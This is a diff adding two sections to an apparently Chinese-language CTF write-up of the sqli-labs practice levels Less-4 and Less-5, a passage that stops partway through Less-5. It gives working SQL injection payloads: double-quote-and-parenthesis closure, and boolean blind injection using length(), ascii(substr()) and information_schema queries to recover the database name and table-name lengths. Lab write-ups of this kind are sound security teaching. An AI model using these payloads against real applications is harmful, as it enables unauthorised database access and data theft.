@@ -138,3 +138,82 @@
 
 ### Less-4
 
+使用 `1 and 1=1` ， `1 and 1=2` ， `1'` 均无报错，考虑可能是双引号闭合，使用双引号进行尝试
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/2QWU%BT[VUC0O4UQ$]}06N8.png?raw=true">
+
+根据报错信息，双引号后还有个括号，因此尝试 `1") %23`
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/L]BFGW[I55E[L1Z7BDN16M3.png?raw=true">
+
+查询成功，以下过程省略
+
+*注：此题注入语句为 `?id=0") <SQL Injection Statement> %23`* 
+
+### Less-5
+
+根据报错信息，可以确定本题为字符型注入
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/95N3IWZGFV{@_4O3AW3WYSW.png?raw=true">
+
+但是，填入 `?id=1' %23` 后，页面不存在回显点
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/DVMQ80(63AOWW1%26PL{2GS.png?raw=true">
+
+进行布尔盲注，先判断数据库名长度，使用二分法
+
+```sql
+?id=1' and length((select database()))>9 %23
+```
+
+*注：length()函数是获取返回值的长度*
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/B(_@MYR%KE_%EUG444KF701.png?raw=true">
+
+无返回结果，数据库名长度小于等于9
+
+```sql
+?id=1' and length((select database()))>4 %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/_V{}_IM[{}6X(J~C_%U8QNW.png?raw=true">
+
+有返回结果，现在使用等于一个一个尝试，过程省略，直接公布结果
+
+```sql
+?id=1' and length((select database()))=8 %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/GL~C(4~_}1QA~0`2MZ50W]W.png?raw=true">
+
+确定数据库名长度为8，现在开始判断数据库名，下面的语句是判断第一个字母是否为大写A
+
+```sql
+?id=1' and ascii(substr((select database()),1,1))=65 %23
+```
+
+*注：ascii()函数将参数转换为ascii码，substr(arg1, arg2, arg3)是截取函数，返回值是一个字符串，arg1为截取内容，arg2是相对截取位置，从1开始，arg3是截取长度*
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/}TGW0Y$BI58G{F(]}SYX$J0.png?raw=true">
+
+无返回结果，说明第一个字母不是大写A，然后继续判断大写B，以下过程省略
+
+```sql
+?id=1' and ascii(substr((select database()),1,1))=115 %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/X2VBV)}L_MHMCV3S}]O[KUQ.png?raw=true">
+
+当判断到115的时候出现返回结果，确定数据库名第一个字母为小写s，然后开始判断第二个字母，以下过程省略
+
+*注：判断字母同样可以使用二分法*
+
+现在已知数据库名为security，开始判断所有表名长度
+
+```sql
+?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>10 %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/LZDDYKG)A]6E${JVJ`7U3TM.png?raw=true">
+
+出现返回结果，所有表名长度大于10
